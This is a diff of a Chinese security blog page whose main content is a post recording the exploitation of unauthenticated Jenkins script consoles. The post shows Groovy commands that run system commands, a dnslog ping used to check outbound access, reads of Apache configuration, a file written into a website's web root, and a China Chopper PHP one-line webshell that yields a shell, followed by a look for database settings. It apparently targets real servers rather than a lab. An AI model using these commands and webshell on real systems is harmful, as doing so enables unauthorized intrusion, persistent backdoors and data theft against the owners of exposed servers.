@@ -6,14 +6,31 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2020/1 | ConanStudio</title>
+  <title>Jenkins未授权访问漏洞 | ConanStudio</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="ConanStudio">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;archives&#x2F;2020&#x2F;01&#x2F;index.html">
+  <meta name="description" content="Jenkins未授权访问漏洞 未授权访问管理控制台,可以通过脚本命令行执行系统命令。 通过该漏洞,可以后台管理服务,通过脚本命令行功能执行系统命令,如反弹shell,wget写webshell文件。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jenkins未授权访问漏洞">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;12&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;index.html">
 <meta property="og:site_name" content="ConanStudio">
+<meta property="og:description" content="Jenkins未授权访问漏洞 未授权访问管理控制台,可以通过脚本命令行执行系统命令。 通过该漏洞,可以后台管理服务,通过脚本命令行功能执行系统命令,如反弹shell,wget写webshell文件。">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;10.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;11.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;12.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;13.png">
+<meta property="og:updated_time" content="2020-02-22T07:29:08.568Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;conanstudio-1300441002.cos.ap-chengdu.myqcloud.com&#x2F;Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E&#x2F;1.png">
   
     <link rel="alternative" href="/atom.xml" title="ConanStudio" type="application/atom+xml">
   
@@ -153,49 +170,218 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-Jenkins未授权访问漏洞" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/21/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/" class="archive-article-date">
-  	<time datetime="2020-01-21T06:25:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-21</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/21/Jboss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/">Jboss反序列化漏洞记录</a>
+    <h1 class="article-title" itemprop="name">
+      Jenkins未授权访问漏洞
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2020/02/12/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
+  	<time datetime="2020-02-12T06:52:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Jenkins未授权访问漏洞</p>
+<p>未授权访问管理控制台,可以通过脚本命令行执行系统命令。</p>
+<p>通过该漏洞,可以后台管理服务,通过脚本命令行功能执行系统命令,如反弹shell,wget写webshell文件。 </p>
+<a id="more"></a>
 
+<p>访问直接进入</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/1.png" alt="img"></p>
+<p>在系统管理里 找到脚本命令</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/2.png" alt="img"></p>
+<ul>
+<li>println “whoami”.execute().text</li>
+</ul>
+<p>执行命令</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/3.png" alt="img"></p>
+<p>ping dnslog 无连接 该服务器无法出网且没有web 遂放弃</p>
+<p>换一个又来</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/4.png" alt="img"></p>
+<p>ping dnslog</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/5.png" alt="img"></p>
+<p>数据已经过来可以出网</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/6.png" alt="img"></p>
+<p>查找web路径</p>
+<ul>
+<li>println “httpd -V”.execute().text</li>
+</ul>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/7.png" alt="img"></p>
+<p>查看配置文件</p>
+<ul>
+<li>println “cat /www/server/apache/conf/httpd.conf”.execute().text</li>
+</ul>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/8.png" alt="img"></p>
+<ul>
+<li>ls -l /www/server/apache/bin</li>
+</ul>
+<p>找到网站目录 /www/wwwroot/faka/faka/</p>
+<p>确认网站目录</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/9.png" alt="img"></p>
+<ul>
+<li>new File (“/www/wwwroot/faka/faka/1.php”).write(‘<?php phpinfo(); ?>‘);</li>
+</ul>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/10.png" alt="img"></p>
+<p>写入1.php成功</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/11.png" alt="img"></p>
+<ul>
+<li>现在写入菜刀一句话<?php @eval($_POST['pass']) ?></li>
+</ul>
+<p>一句话一定转译单引号</p>
+<ul>
+<li>new File (“/www/wwwroot/xxx/xxx/baidu.php”).write(‘<?php @eval($_POST[\'pass\']) ?>‘);</li>
+</ul>
+<p>拿到shell</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/12.png" alt="img"></p>
+<p>从配置文件找到数据库</p>
+<p><img src="https://conanstudio-1300441002.cos.ap-chengdu.myqcloud.com/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/13.png" alt="img"></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/02/12/Jenkins%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+    <a href="/2020/02/13/Weblogic%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Weblogic实战记录
+        
+      </div>
+    </a>
   
   
-    </div></section>
+    <a href="/2020/02/11/Shiro%E5%8F%8D%E5%BC%B9shell/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">shiro反弹shell</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -218,8 +404,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
